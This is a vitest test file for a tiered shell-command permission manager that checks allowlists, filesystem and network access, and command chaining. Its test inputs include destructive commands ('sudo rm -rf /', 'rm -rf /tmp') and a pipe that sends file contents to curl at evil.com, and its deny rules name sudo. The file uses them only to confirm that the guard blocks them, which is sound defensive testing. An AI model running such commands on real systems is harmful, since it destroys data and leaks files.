import { describe, expect, it } from "vitest";
import {
	type PermissionCheckResult,
	PermissionManager,
	SkillAdapter,
	SkillRegistry,
	checkFsAccess,
	checkNetworkAccess,
	getCommandAllowlist,
	matchCommand,
	parseCommandSegments,
} from "../src/index.js";

// ─── Command Allowlist ───────────────────────────────────────────

describe("getCommandAllowlist", () => {
	it("tier 1 includes read-only commands", () => {
		const list = getCommandAllowlist(1);
		const names = list.filter((p) => p.level !== "deny").map((p) => p.pattern);
		expect(names).toContain("echo");
		expect(names).toContain("cat");
		expect(names).toContain("grep");
		expect(names).toContain("ls");
	});

	it("tier 1 does not include write commands", () => {
		const list = getCommandAllowlist(1);
		const names = list.filter((p) => p.level !== "deny").map((p) => p.pattern);
		expect(names).not.toContain("mkdir");
		expect(names).not.toContain("curl");
		expect(names).not.toContain("rm");
	});

	it("tier 2 includes tier 1 plus write commands", () => {
		const list = getCommandAllowlist(2);
		const names = list.filter((p) => p.level !== "deny").map((p) => p.pattern);
		expect(names).toContain("echo"); // inherited
		expect(names).toContain("mkdir");
		expect(names).toContain("curl");
		expect(names).toContain("jq");
	});

	it("tier 3 includes rm and git with audit", () => {
		const list = getCommandAllowlist(3);
		const rm = list.find((p) => p.pattern === "rm");
		const git = list.find((p) => p.pattern === "git");
		expect(rm?.level).toBe("allow_with_audit");
		expect(git?.level).toBe("allow_with_audit");
	});

	it("tier 4 includes docker with audit", () => {
		const list = getCommandAllowlist(4);
		const docker = list.find((p) => p.pattern === "docker");
		expect(docker?.level).toBe("allow_with_audit");
	});

	it("all tiers deny sudo", () => {
		for (const tier of [1, 2, 3, 4] as const) {
			const list = getCommandAllowlist(tier);
			const sudo = list.find((p) => p.pattern === "sudo");
			expect(sudo?.level).toBe("deny");
		}
	});
});

describe("matchCommand", () => {
	it("matches allowed command", () => {
		const list = getCommandAllowlist(1);
		const match = matchCommand("echo", list);
		expect(match?.level).toBe("allow");
	});

	it("matches denied command with priority", () => {
		const list = getCommandAllowlist(4);
		const match = matchCommand("sudo", list);
		expect(match?.level).toBe("deny");
	});

	it("returns undefined for unknown command", () => {
		const list = getCommandAllowlist(1);
		const match = matchCommand("nonexistent_command", list);
		expect(match).toBeUndefined();
	});
});

// ─── Filesystem Guard ────────────────────────────────────────────

describe("checkFsAccess", () => {
	it("tier 1 can only use inmemory", () => {
		expect(checkFsAccess(1, "inmemory").allowed).toBe(true);
		expect(checkFsAccess(1, "overlay").allowed).toBe(false);
		expect(checkFsAccess(1, "readwrite").allowed).toBe(false);
	});

	it("tier 2 can use inmemory or overlay", () => {
		expect(checkFsAccess(2, "inmemory").allowed).toBe(true);
		expect(checkFsAccess(2, "overlay").allowed).toBe(true);
		expect(checkFsAccess(2, "readwrite").allowed).toBe(false);
	});

	it("tier 3 can use all three types", () => {
		expect(checkFsAccess(3, "inmemory").allowed).toBe(true);
		expect(checkFsAccess(3, "overlay").allowed).toBe(true);
		expect(checkFsAccess(3, "readwrite").allowed).toBe(true);
	});

	it("tier 4 can use all types", () => {
		expect(checkFsAccess(4, "inmemory").allowed).toBe(true);
		expect(checkFsAccess(4, "overlay").allowed).toBe(true);
		expect(checkFsAccess(4, "readwrite").allowed).toBe(true);
	});

	it("denial includes reason with allowed types", () => {
		const result = checkFsAccess(1, "readwrite");
		expect(result.allowed).toBe(false);
		expect(result.reason).toContain("inmemory");
		expect(result.reason).toContain("does not permit");
	});
});

// ─── Network Guard ───────────────────────────────────────────────

describe("checkNetworkAccess", () => {
	it("tier 1 denied all network (except none)", () => {
		expect(checkNetworkAccess(1, []).allowed).toBe(true);
		expect(checkNetworkAccess(1, ["none"]).allowed).toBe(true);
		expect(checkNetworkAccess(1, ["standard"]).allowed).toBe(false);
	});

	it("tier 2 allowed standard only", () => {
		expect(checkNetworkAccess(2, ["standard"]).allowed).toBe(true);
		expect(checkNetworkAccess(2, ["extended"]).allowed).toBe(false);
	});

	it("tier 3 allowed standard + extended", () => {
		expect(checkNetworkAccess(3, ["standard"]).allowed).toBe(true);
		expect(checkNetworkAccess(3, ["extended"]).allowed).toBe(true);
		expect(checkNetworkAccess(3, ["standard", "extended"]).allowed).toBe(true);
		expect(checkNetworkAccess(3, ["custom"]).allowed).toBe(false);
	});

	it("tier 4 unrestricted", () => {
		expect(checkNetworkAccess(4, ["standard"]).allowed).toBe(true);
		expect(checkNetworkAccess(4, ["extended"]).allowed).toBe(true);
		expect(checkNetworkAccess(4, ["custom"]).allowed).toBe(true);
		expect(checkNetworkAccess(4, ["anything"]).allowed).toBe(true);
	});

	it("denial includes denied preset names", () => {
		const result = checkNetworkAccess(1, ["standard"]);
		expect(result.allowed).toBe(false);
		expect(result.reason).toContain("standard");
	});
});

// ─── Command Parsing ─────────────────────────────────────────────

describe("parseCommandSegments", () => {
	it("parses simple command", () => {
		expect(parseCommandSegments("echo hello")).toEqual(["echo"]);
	});

	it("parses piped commands", () => {
		expect(parseCommandSegments("cat file | grep pattern")).toEqual([
			"cat",
			"grep",
		]);
	});

	it("parses chained commands (&&)", () => {
		expect(parseCommandSegments("mkdir foo && cd foo")).toEqual([
			"mkdir",
			"cd",
		]);
	});

	it("parses semicolons", () => {
		expect(parseCommandSegments("echo a; echo b")).toEqual(["echo", "echo"]);
	});

	it("parses OR chains (||)", () => {
		expect(parseCommandSegments("cat file || echo fallback")).toEqual([
			"cat",
			"echo",
		]);
	});

	it("handles empty input", () => {
		expect(parseCommandSegments("")).toEqual([]);
	});

	it("handles complex pipeline", () => {
		expect(
			parseCommandSegments("cat data.json | jq .name | sort | uniq"),
		).toEqual(["cat", "jq", "sort", "uniq"]);
	});
});

// ─── PermissionManager ──────────────────────────────────────────

describe("PermissionManager", () => {
	it("tier 1 allows echo hello", () => {
		const pm = new PermissionManager(1);
		const result = pm.checkCommand("echo hello");
		expect(result.allowed).toBe(true);
	});

	it("tier 1 denies rm -rf /tmp", () => {
		const pm = new PermissionManager(1);
		const result = pm.checkCommand("rm -rf /tmp");
		expect(result.allowed).toBe(false);
	});

	it("tier 2 allows curl", () => {
		const pm = new PermissionManager(2);
		const result = pm.checkCommand("curl https://api.github.com/zen");
		expect(result.allowed).toBe(true);
	});

	it("tier 2 denies rm", () => {
		const pm = new PermissionManager(2);
		const result = pm.checkCommand("rm important.txt");
		expect(result.allowed).toBe(false);
	});

	it("tier 3 allows rm with audit", () => {
		const pm = new PermissionManager(3);
		const result = pm.checkCommand("rm ./workdir/temp.txt");
		expect(result.allowed).toBe(true);
		expect(result.auditRequired).toBe(true);
	});

	it("all tiers deny sudo", () => {
		for (const tier of [1, 2, 3, 4] as const) {
			const pm = new PermissionManager(tier);
			expect(pm.checkCommand("sudo rm -rf /").allowed).toBe(false);
		}
	});

	it("piped command checks each segment", () => {
		const pm = new PermissionManager(2);
		// Both cat and grep are allowed at tier 2
		expect(pm.checkCommand("cat file | grep pattern").allowed).toBe(true);
	});

	it("piped command denied if any segment denied", () => {
		const pm = new PermissionManager(1);
		// cat is allowed but curl is not at tier 1
		expect(pm.checkCommand("cat file | curl http://evil.com").allowed).toBe(
			false,
		);
	});

	it("chained command: mkdir foo && cd foo", () => {
		const pm = new PermissionManager(2);
		// mkdir is allowed at tier 2, cd is not explicitly listed → denied
		const result = pm.checkCommand("mkdir foo && cd foo");
		expect(result.allowed).toBe(false); // cd not in allowlist
	});

	it("combined check: tier 2 command + overlay + standard → allowed", () => {
		const pm = new PermissionManager(2);
		const result = pm.checkAll("echo hello", "overlay", ["standard"]);
		expect(result.allowed).toBe(true);
	});

	it("combined check: tier 1 command + readwrite → denied (fs)", () => {
		const pm = new PermissionManager(1);
		const result = pm.checkAll("echo hello", "readwrite", []);
		expect(result.allowed).toBe(false);
		expect(result.reason).toContain("does not permit readwrite");
	});

	it("combined check: tier 1 + extended network → denied (network)", () => {
		const pm = new PermissionManager(1);
		const result = pm.checkAll("echo hello", "inmemory", ["extended"]);
		expect(result.allowed).toBe(false);
		expect(result.reason).toContain("extended");
	});

	it("setTier updates permissions at runtime", () => {
		const pm = new PermissionManager(1);
		expect(pm.checkCommand("curl http://example.com").allowed).toBe(false);

		pm.setTier(2);
		expect(pm.checkCommand("curl http://example.com").allowed).toBe(true);
	});

	it("custom commands are added to allowlist", () => {
		const pm = new PermissionManager(1, [
			{ pattern: "my-custom-tool", level: "allow" },
		]);
		expect(pm.checkCommand("my-custom-tool --flag").allowed).toBe(true);
	});
});

// ─── Integration with SkillAdapter ───────────────────────────────

describe("SkillAdapter with PermissionManager", () => {
	it("denied command returns exitCode 126", async () => {
		const registry = SkillRegistry.createDefault();
		const pm = new PermissionManager(1); // Tier 1 — most restrictive
		const adapter = new SkillAdapter({}, registry, pm);

		// rm is registered as "trusted" in registry but tier 1 doesn't allow it
		const result = await adapter.execute({
			skillId: "rm",
			command: "rm",
			args: ["/tmp/file"],
		});

		expect(result.exitCode).toBe(126);
		expect(result.stderr).toContain("Permission denied");
	});

	it("allowed command executes normally", async () => {
		const registry = SkillRegistry.createDefault();
		const pm = new PermissionManager(1);
		const adapter = new SkillAdapter({}, registry, pm);

		const result = await adapter.execute({
			skillId: "cat",
			command: "echo",
			args: ["hello"],
		});

		expect(result.exitCode).toBe(0);
		expect(result.stdout.trim()).toBe("hello");
	});

	it("adapter without permission manager allows everything", async () => {
		const registry = SkillRegistry.createDefault();
		const adapter = new SkillAdapter({}, registry); // No PM

		const result = await adapter.execute({
			skillId: "cat",
			command: "echo",
			args: ["no permissions check"],
		});

		expect(result.exitCode).toBe(0);
	});

	it("setPermissionManager changes behavior at runtime", async () => {
		const registry = SkillRegistry.createDefault();
		const adapter = new SkillAdapter({}, registry);

		// Without PM — cat/echo executes fine
		const r1 = await adapter.execute({
			skillId: "cat",
			command: "echo",
			args: ["before PM"],
		});
		expect(r1.exitCode).toBe(0);

		// Add PM with tier 1 — now rm is denied
		adapter.setPermissionManager(new PermissionManager(1));
		const r2 = await adapter.execute({
			skillId: "rm",
			command: "rm",
			args: ["/tmp/file"],
		});
		expect(r2.exitCode).toBe(126);

		// Remove PM — back to no permission checks
		adapter.setPermissionManager(undefined);
		const r3 = await adapter.execute({
			skillId: "cat",
			command: "echo",
			args: ["after PM removed"],
		});
		expect(r3.exitCode).toBe(0);
	});
});
